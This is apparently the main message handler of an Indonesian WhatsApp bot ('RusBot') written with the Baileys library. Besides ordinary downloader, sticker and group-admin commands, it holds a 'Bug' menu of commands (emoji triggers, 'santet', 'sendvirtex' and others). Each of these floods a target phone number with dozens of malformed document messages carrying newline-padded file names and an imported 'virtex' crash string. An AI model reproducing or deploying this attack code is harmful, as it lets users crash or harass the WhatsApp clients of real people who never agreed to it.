require("./setting")
const { baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@adiwajshing/baileys")
const { cekGrup } = require("./basexd/lib/myfunc")
const { getGroupAdmins, fetchJson, reSize, generateProfilePicture, sleep, getBuffer, isUrl, runtime, formatp } = require("./basexd/lib/functions.js")
const { konf } = require("./basexd/virtex/konf")
const { exec, spawn, execSync } = require("child_process")
const cheerio = require("cheerio")
const chalk = require("chalk")
const util = require("util")
const axios = require("axios")
const fs = require("fs")
const os = require("os")
const syntaxerror = require("syntax-error")
const Jimp = require("jimp")
const PhoneNumber = require("awesome-phonenumber")
const speed = require("performance-now")
const moment = require("moment-timezone")
const grup = JSON.parse(fs.readFileSync("./database/grup.json"))
const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
//====================================================================//
module.exports = xd = async (xd, m, chatUpdate, store) => { 
try {
const type = getContentType(m.message)
const content = JSON.stringify(m.message)
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const qmsg = (quoted.m || quoted)
const mime = (quoted.m || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(m.quoted ? m.quoted.mtype : m.mtype)
const body = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
//====================================================================//
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup? await xd.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = isGroup? groupMetadata.subject : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participants = isGroup? await groupMetadata.participants : ""
const groupAdmins = isGroup? await participants.filter(v => v.admin !== null).map(v => v.id) : ""
const groupMembers = isGroup? groupMetadata.participants : ""
const isAdmins = isGroup? groupAdmins.includes(m.sender) : false
//====================================================================//
const botNumber = await xd.decodeJid(xd.user.id)
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const sender = m.key.fromMe ? (xd.user.id.split(':')[0]+'@s.whatsapp.net' || xd.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isOwner = ownerNomer.includes(senderNumber) || isBot
const isPrem = premium.includes(senderNumber) || isOwner
const jamwib = await moment.tz('Asia/Jakarta').format('HH')
const menitwib = await moment.tz('Asia/Jakarta').format('mm')
const detikwib = await moment.tz('Asia/Jakarta').format('ss')
const isAntiLink = antilink.includes(from) ? true : false
//====================================================================//
const reply = (teks) => { 
xd.sendMessage(from, { text : teks }, { quoted : m})}
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]}
//====================================================================//
if (isCmd && m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 
}
//====================================================================//
if (isCmd && !m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 
}
//====================================================================//
if (isGroup && isAntiLink && isBotAdmins){
if (body.includes(`http://chat.whatsapp.com/`)) {
if (!isBotAdmins) return reply('Untung Bot Ga Jadi Admin')
if (isOwner) return reply('Untung Lu Owner Gw')
if (isAdmins) return reply('Admin Grup Mah Bebas')
if (fromMe) return reply('Bot Bebas Share Link')
await xd.sendMessage(from, { delete: m.key })
reply(`*LINK GROUP DETECT*\nLink Group Ini Telah Di Hapus Oleh Bot\nJangan Share Link Group Lagi Ya 🗿`)
xd.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}}
//====================================================================//
let flok = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `XdBot WhatsApp`}}}
//====================================================================//
const xdbot = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": { 
"stickerMessage": { 
"mimetype": "image/webp", 
"caption": `${konf}`, 
"jpegThumbnail": thumb
}}}
//====================================================================//
switch (command) {
case "menu": case "allmenu": {
const own = `${ownerNomer}@s.whatsapp.net`
let timestamp = speed()
let latensi = speed() - timestamp
ya = `𝗜𝗻𝗳𝗼 𝗕𝗼𝘁
».Owner : @${own.split("@")[0]}
».Versi Bot : 1.0.0
».Bot Nama : RusBot
».Speed Bot : ${latensi.toFixed(4)}

𝗨𝗻𝗱𝘂𝗵 𝗠𝗲𝗻𝘂
».ytmp4
».gitclone
».tiktokmp3
».tiktokmp4
».mediafire

𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂
».tqto
».ping
».script
».owner
».sticker
».murbug
».runtime

𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂
».kick
».open
».close
».revoke
».antilink
».hidetag
».linkgroup

𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂
».self
».public
».delgc
».addgc
».idgroup
».delprem
».addprem
».setppbot

𝗕𝘂𝗴 𝗘𝗺𝗼𝗷𝗶
».🔥 *62xx*
».⚡ *62xx*
».😏 *62xx*
».🙏 *62xx*
».🌷 *62xx*
».🥶 *62xx*
».😎 *62xx*
».👻 *62xx*
».😉 *62xx*

𝗕𝘂𝗴 𝗢𝘁𝗵𝗲𝗿
».santet *62xx*
».bugtrol *62xx*
».gasbug *62xx*
».bugfour *62xx*
».bughole *62xx*
».bugdocu *62xx*
».sendvirtex *62xx*
».sendtrava *62xx*
».bugmental *62xx*
».sendphilips *62xx*
».bugdarknes *62xx*
`
await xd.sendMessage(from, {caption: ya, image: global.thumb, mentions:[own, sender]}, {quoted: m})
}
break
//====================================================================//
case "tqto": {
xx = `*Thanks To*
».Kirbotz
».Dan Creator Bot Lainya
`
reply(xx)
}
break
//====================================================================//
case "hidetag": case "h":
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.BotAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
xd.sendMessage(from, { text: q ? q : '', mentions: mem })
break
//====================================================================//
case "owner": {
xd.sendContact(from, global.ownerNomer, flok)
}
break
//====================================================================//
case "kick": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} tag\nContoh ${prefix+command} tag orang nya`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(`Sukses Mengkick Target`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "antilink": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!args[0]) return reply(`*Contoh ${command} off / on*\n*Contoh ${command} on*`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink Sudah Aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Berhasil Mengaktifkan Antilink')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink Belum Aktif')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Berhasil MengNonaktifkan Antilink')
} else { reply('Kata Kunci Salah') }
}
break
//====================================================================//
case "revoke": {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isOwner) return reply(mess.admin)
await xd.groupRevokeInvite(m.chat).then((res) => reply(`*Sukses Meriset Link Group*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "linkgroup": case "linkgc": {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let response = await xd.groupInviteCode(m.chat)
reply("https://chat.whatsapp.com/" + response) 
}
break
//====================================================================//
case "sticker": case "s": {
if (!qmsg) return reply(`*Reply Gambar Dengan Caption ${command}*`)
if (/image/.test(mime)) {
reply(mess.wait) 
let media = await qmsg.download()
let encmedia = await xd.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((qmsg.m || qmsg).seconds > 11) return reply('*Durasi Video Nya Kepanjangan Maksimal 10 Detik*')
let media = await qmsg.download()
let encmedia = await xd.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`*Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik*`)
}}
break
//====================================================================//
case "tes": {
let timestamp = speed()
let latensi = speed() - timestamp
teks1 = `*Speed Bot :* ${latensi.toFixed(4)}`
xd.sendMessage(from, {text: teks1}, {quoted: flok})
}
break
//====================================================================//
case "ping": {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
reply(respon)
}
break
//====================================================================//
case "ytmp4": case "ytvideo": {
let { ytv } = require("./basexd/lib/y2mate")
if (!text) return reply(`${command} link yt\nContoh : ${command} https://youtube.com/shorts/OPTqJuuOcVI?feature=share`)
reply(mess.wait)
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas!!!'+util.format(media))
xd.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: ` Title : ${media.title}\n File Size : ${media.filesizeF}\n Url : ${isUrl(text)}\n Ext : MP3\n Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//====================================================================//
case "tiktokmp4": {
if (!text) return reply(`Contoh ${command} link tiktok`)
if (!q.includes('tiktok')) return reply(`Itu Bukan Link Tiktok Pepek -_-`)
reply(mess.wait)
require("./basexd/lib/tiktok").Tiktok(q).then( data => {
xd.sendMessage(from, { caption: `Ini Video Nya`, video: { url: data.watermark }, footer: botNama, mentions: [m.sender] })
})}
break
//====================================================================//
case "tiktokmp3": {
if (!text) return reply(`Contoh ${command} link tiktok`)
if (!args[0]) return reply(`Contoh ${command} https://vt.tiktok.com/ZSLwQxcJ/`)
reply(mess.wait)
require("./basexd/lib/tiktok").Tiktok(q).then( data => {
xd.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})}
break
//====================================================================//
case "mediafire": {
if (!text) return reply(`Link Nya Mana Bro?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Itu Bukan Link Media Fire Pepek -_-`)
reply(mess.wait)
const { mediafireDl } = require("./basexd/lib/mediafire.js")
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
xd.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(`Fitur Sedang Eror`))
}
break
//====================================================================//
case "gitclone": {
if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/SanXd2/script`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Itu Bukan Link Github Pepek -_-`)
reply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
xd.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("Done Bang"))
}
break
//====================================================================//
case "script": case "sc": {
const noteg = `${ownerNomer}@s.whatsapp.net`
teksxx = `Minta Ke @${noteg.split("@")[0]}, Kalo Di Kasih Hoki :V`
xd.sendMessage(from, {text: teksxx, mentions:[noteg, sender]}, {quoted: flok})
}
break
//====================================================================//
case "murbug": {
const noteg = `${ownerNomer}@s.whatsapp.net`
tesh = `Chat @${noteg.split("@")[0]}`
xd.sendMessage(from, {text: tesh, mentions:[noteg, sender]}, {quoted: flok})
}
break
//====================================================================//
case "runtime": {
tekszx = `*Bot Aktif Selama :*\n${runtime(process.uptime())}`
reply(tekszx)
}
break
//====================================================================//
case "self": {
if (!isOwner) return reply(mess.owner)
xd.public = false
reply(`Mode Self`)
}
break
//====================================================================//
case "public": {
if (!isBot) return reply(mess.bot)
xd.public = true
reply(`Mode Public`)
}
break
//====================================================================//
case "idgroup":{
if (!isOwner) return reply(mess.owner)
fss = `${from}`
reply(fss)
}
break
//====================================================================//
case "open": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "close": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "🔥": case "⚡": case "😏": case "🙏": case "🌷": case "🥶": case "😎": case "👻": case "😉": {
if (!isGroup) return reply(mess.group)
id = m.key.remoteJid
if (cekGrup(id,grup)) {
if (args.length < 1) return reply(`Contoh ${command} 6285793433348`)
num = `${text}`+`@s.whatsapp.net`
jumlah = "30"
let cek1 = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (cek1.length == 0) return reply(`Nomer Ini Tidak Terdaftar Di WhatsApp`)
reply(`*Berhasil Mengirim :* ${command}\n*Target :* ${text}\n*Jangan Lupa Jeda 5 Menit*`)
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, { document: thumb, caption: "𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥", fileName: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${konf}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: xdbot})
await sleep(1000)
xd.sendMessage(num, {text: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥`}, {quoted: xdbot})
await sleep(1000)
xd.sendMessage(num, { document: thumb, caption: "𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥", fileName: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${konf}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: xdbot})
await sleep(1000)
}}else{
reply(`*Maaf Group Ini Tidak Tersedia Di Database Jadinya Gabisa Menggunakan Fitur Ini*`)}
}
break
//====================================================================//
case "santet": case "bugtrol": case "gasbug": case "bugfour": case "bughole": case "bugdocu": case "sendvirtex": case "sendtrava": case "bugmental": case "sendphilips": case "bugdarknes": {
if (!isGroup) return reply(mess.group)
id = m.key.remoteJid
if (cekGrup(id,grup)) {
if (args.length < 1) return reply(`Contoh ${command} 6285793433348`)
num = `${text}`+`@s.whatsapp.net`
jumlah = "30"
let cek2 = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (cek2.length == 0) return reply(`Nomer Ini Tidak Terdaftar Di WhatsApp`)
reply(`*Berhasil Mengirim :* ${command}\n*Target :* ${text}\n*Jangan Lupa Jeda 5 Menit*`)
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, { document: thumb, caption: "𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥", fileName: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${konf}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: xdbot})
await sleep(1000)
xd.sendMessage(num, {text: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥`}, {quoted: xdbot})
await sleep(1000)
xd.sendMessage(num, { document: thumb, caption: "𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥", fileName: `𝑅𝑢𝑠𝐵𝑜𝑡 ⚡🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${konf}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: xdbot})
await sleep(1000)
}}else{
reply(`*Maaf Group Ini Tidak Tersedia Di Database Jadinya Gabisa Menggunakan Fitur Ini*`)}
}
break
//====================================================================//
case "delgc":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} idgc*`)
unp = grup.indexOf(from)
grup.splice(unp, 1)
fs.writeFileSync('./database/grup.json', JSON.stringify(grup))
reply(`*Sukses Grup Ini Telah Di Hapus Di Database*`)
break
//====================================================================//
case "addgc":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} idgc\nCara Liat idgc Nya Ketik idgc*`)
grup.push(from)
fs.writeFileSync('./database/grup.json', JSON.stringify(grup, null, 2))
reply(`*Sukses Group Ini Telah Terdaftar Di Database*`)
break
//====================================================================//
case "delprem":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} 6285793433348*`)
unp = premium.indexOf(from)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`*Sukses Nomer Ini Sudah Tidak Menjadi User Premium*`)
break
//====================================================================//
case "addprem":
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!args[0]) return reply(`*Contoh ${command} 6285793433348*`)
premium.push(from)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium, null, 2))
reply(`*Sukses Nomer Ini Telah Menjadi User Premium*`)
break
//====================================================================//
case "setppbot":{
if (!isBot && !isOwner) return reply(mess.owner)
if (!/image/.test(mime)) return reply(`*Reply Image Dengan Caption ${command}*`)
if (/webp/.test(mime)) return reply(`*Reply Image Dengan Caption ${command}*`)
let media = await xd.downloadAndSaveMediaMessage(qmsg)
await xd.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply(`Done`)
}
break
//====================================================================//
default:
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
xd.sendMessage("6285793433348@s.whatsapp.net", {text:e})
}}
//====================================================================//
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyanBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})